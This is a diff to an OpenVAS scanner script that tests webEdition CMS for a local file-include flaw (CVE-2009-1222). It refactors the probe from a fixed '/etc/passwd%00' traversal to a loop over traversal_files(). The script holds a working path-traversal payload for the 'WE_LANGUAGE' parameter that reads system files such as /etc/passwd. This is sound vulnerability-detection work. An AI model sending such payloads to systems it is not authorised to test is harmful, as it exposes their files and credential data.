@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: webEdition_34323.nasl 5231 2017-02-08 11:52:34Z teissa $
+# $Id: webEdition_34323.nasl 5768 2017-03-29 13:37:01Z cfi $
 #
 # webEdition CMS 'WE_LANGUAGE' Parameter Local File Include
 # Vulnerability
@@ -35,25 +35,22 @@ tag_summary = "webEdition CMS is prone to a local file-include vulnerability
   webEdition CMS 6.0.0.4 is vulnerable; other versions may also be
   affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100103);
- script_version("$Revision: 5231 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-08 12:52:34 +0100 (Wed, 08 Feb 2017) $");
+ script_version("$Revision: 5768 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:37:01 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-04-05 13:52:05 +0200 (Sun, 05 Apr 2009)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1222");
  script_bugtraq_id(34323);
-
  script_name("webEdition CMS 'WE_LANGUAGE' Parameter Local File Include Vulnerability");
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
+ script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "summary" , value : tag_summary);
@@ -62,27 +59,27 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port)) exit(0);
 
-dir = make_list("/webEdition","/cms",cgi_dirs());
+files = traversal_files();
 
-foreach d (dir)
-{ 
- url = string(d, '/index.php?WE_LANGUAGE=../../../../../../../../etc/passwd%00');
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
- if( buf == NULL )continue;
+foreach dir( make_list_unique( "/webEdition", "/cms", cgi_dirs( port:port ) ) ) { 
 
- if ( egrep(pattern:"root:.*:0:[01]:.*", string: buf) )
-     
- 	{    
-       	  security_message(port:port);
-          exit(0);
-        }
+  if( dir == "/" ) dir = "";
+
+  foreach file (keys(files)) {
+
+    url = string(dir, '/index.php?WE_LANGUAGE=../../../../../../../../',files[file] , '%00');
+
+    if(http_vuln_check(port:port, url:url,pattern:file)) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
+  }
 }
 
-exit(0);
+exit( 99 );
